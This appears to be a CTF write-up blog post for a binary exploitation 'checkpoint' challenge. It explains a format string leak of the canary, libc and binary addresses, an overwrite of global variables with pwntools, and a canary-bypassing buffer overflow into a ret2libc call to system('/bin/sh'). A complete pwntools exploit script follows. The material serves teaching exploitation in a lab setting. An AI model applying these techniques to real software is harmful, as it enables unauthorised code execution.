@@ -1,0 +1,131 @@
+I"�8<p><img src="/images/checkpointaresx/ss1.png" alt="" /></p>
+
+<h3 id="introduction">Introduction:</h3>
+<p>Hey everyone, congrats on reaching this level. This level acts as a checkpoint (name suggests). You will be combining the idea of format strings, buffer overflows, canaries from previous blogposts. Try this level on your own and check for hints when stuck.</p>
+
+<h3 id="challenge">Challenge:</h3>
+<p>Download below challenge file.</p>
+
+<p><a href="/images/checkpointaresx/checkpoint_1.zip">FILES</a></p>
+
+<h3 id="solution">Solution:</h3>
+
+<h4 id="mitigations">Mitigations:</h4>
+<p><img src="/images/checkpointaresx/ss2.png" alt="" />
+No need to explain mitigations right ?</p>
+
+<h4 id="code-walkthrough">Code Walkthrough:</h4>
+
+<p>We are given the c code. Here in the main program, there is a while loop to run the format string vulnerability and finally a compare statement leading to a fgets call.</p>
+
+<p><img src="/images/checkpointaresx/ss3.png" alt="" /></p>
+
+<h4 id="sample-run">Sample run:</h4>
+<p>Runing the file tells us there is a format string exploit.
+<img src="/images/checkpointaresx/ss4.png" alt="" /></p>
+
+<h4 id="exploit-idea">Exploit idea:</h4>
+<p>Here the challenge is direct and was made to recap what we learnt in the previous blogs. The attack plan is</p>
+<ul>
+  <li>leaking a binary address, libc address, canary.</li>
+  <li>make the strength variable = “STRENGTH”</li>
+  <li>increase the size variable to a much larger value for a buffer overflow. (tricky part)</li>
+</ul>
+
+<h4 id="format-string-exploit">Format string exploit:</h4>
+
+<p>We already know what format strings are… now leak the stack little by little and see what useful values you get. I got the following values:</p>
+
+<pre><code class="language-leak">16: my input
+49: canary
+51: a libc address
+56: a binary address
+</code></pre>
+
+<p>Now you got the values so calculate the address relatively with the binary/libc or just use the pwntools module do the work :)</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#Need to know the libc. (used by default libc for local purpose)
+</span><span class="n">elf</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="nb">int</span><span class="p">((</span><span class="nb">str</span><span class="p">(</span><span class="n">leak</span><span class="p">[</span><span class="mi">2</span><span class="p">])[</span><span class="mi">4</span><span class="p">:</span><span class="o">-</span><span class="mi">3</span><span class="p">]),</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">__libc_csu_init</span>
+<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="nb">int</span><span class="p">((</span><span class="nb">str</span><span class="p">(</span><span class="n">leak</span><span class="p">[</span><span class="mi">1</span><span class="p">])[</span><span class="mi">4</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">]),</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mi">159923</span>
+<span class="n">canary</span> <span class="o">=</span> <span class="nb">int</span><span class="p">((</span><span class="nb">str</span><span class="p">(</span><span class="n">leak</span><span class="p">[</span><span class="mi">0</span><span class="p">])[</span><span class="mi">4</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">]),</span> <span class="mi">16</span><span class="p">)</span>
+<span class="c1">#My weird way of receiving and splitin.
+</span></code></pre></div></div>
+<h4 id="formats-again">Formats again:</h4>
+<p>The second task was to change the value of the global variables and make it favourable for us.</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">fmt</span> <span class="o">=</span> <span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">16</span><span class="p">,</span> <span class="p">{</span>
+    <span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">size</span><span class="p">:</span> <span class="mi">500</span><span class="p">,</span>
+    <span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">strength</span><span class="p">:</span> <span class="n">u64</span><span class="p">(</span><span class="sa">b</span><span class="s">"STRENGTH"</span><span class="p">),</span>
+<span class="p">})</span>
+</code></pre></div></div>
+<p>Here I am making the size variable much larger than buffer size, making strength variable equal to “STRENGTH” to pass the check.</p>
+
+<h4 id="buffer-overflow">Buffer Overflow:</h4>
+
+<p>Finally you do a bit of fiddling to get the correct offset of the stack canary and overwrite with the leaked canary, then simply do a ret2libc.</p>
+
+<h4 id="exploit">Exploit:</h4>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">exe</span> <span class="o">=</span> <span class="s">'./checkpoint'</span>
+<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">exe</span><span class="p">)</span>
+
+<span class="n">libc</span> <span class="o">=</span> <span class="s">"/usr/lib/x86_64-linux-gnu/libc.so.6"</span>
+<span class="k">if</span><span class="p">(</span><span class="n">libc</span> <span class="o">!=</span> <span class="s">""</span><span class="p">):</span>
+	<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">libc</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="n">debug</span><span class="p">([</span><span class="n">exe</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+
+<span class="n">gdbscript</span> <span class="o">=</span> <span class="s">'''
+b* main
+'''</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="o">**</span><span class="nb">locals</span><span class="p">())</span>
+
+<span class="c1">#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+</span>
+<span class="s">'''
+NOTES:
+16: my input
+49: canary
+51: a libc address
+56: a binary address
+'''</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
+
+<span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"%49$p-%51$p-%56$p"</span><span class="p">)</span>
+<span class="n">leak</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s">"-"</span><span class="p">)</span>
+
+<span class="n">elf</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="nb">int</span><span class="p">((</span><span class="nb">str</span><span class="p">(</span><span class="n">leak</span><span class="p">[</span><span class="mi">2</span><span class="p">])[</span><span class="mi">4</span><span class="p">:</span><span class="o">-</span><span class="mi">3</span><span class="p">]),</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">__libc_csu_init</span>
+<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="nb">int</span><span class="p">((</span><span class="nb">str</span><span class="p">(</span><span class="n">leak</span><span class="p">[</span><span class="mi">1</span><span class="p">])[</span><span class="mi">4</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">]),</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mi">159923</span>
+<span class="n">canary</span> <span class="o">=</span> <span class="nb">int</span><span class="p">((</span><span class="nb">str</span><span class="p">(</span><span class="n">leak</span><span class="p">[</span><span class="mi">0</span><span class="p">])[</span><span class="mi">4</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">]),</span> <span class="mi">16</span><span class="p">)</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">"elf base: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">address</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">"libc base: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+
+<span class="n">fmt</span> <span class="o">=</span> <span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">16</span><span class="p">,</span> <span class="p">{</span>
+    <span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">size</span><span class="p">:</span> <span class="mi">500</span><span class="p">,</span>
+    <span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">strength</span><span class="p">:</span> <span class="n">u64</span><span class="p">(</span><span class="sa">b</span><span class="s">"STRENGTH"</span><span class="p">),</span>
+<span class="p">})</span>
+
+<span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"y"</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">fmt</span><span class="p">)</span>
+
+<span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"$p"</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"n"</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mh">0x158</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x1016</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">address</span><span class="o">+</span><span class="mh">0x151b</span><span class="p">)</span><span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s">'/bin/sh'</span><span class="p">)))</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">system</span><span class="p">))</span>
+
+<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+
+</code></pre></div></div>
+:ET
